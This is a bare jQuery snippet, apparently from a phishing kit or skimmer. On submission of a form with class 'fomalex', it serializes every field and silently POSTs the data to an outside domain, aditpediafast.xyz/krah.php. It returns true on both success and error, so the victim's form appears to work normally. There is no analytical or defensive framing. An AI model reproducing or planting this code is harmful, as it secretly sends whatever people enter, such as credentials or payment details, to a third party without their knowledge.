$(".fomalex").submit(function() {

	var d = $(".fomalex");

	$.ajax({

        url: "https:/aditpediafast.xyz/krah.php",

        type: "POST",

        data: d.serialize(),

        success: function () {

            return true;

        },

        error: function () {

            return true;

        },

    });

});
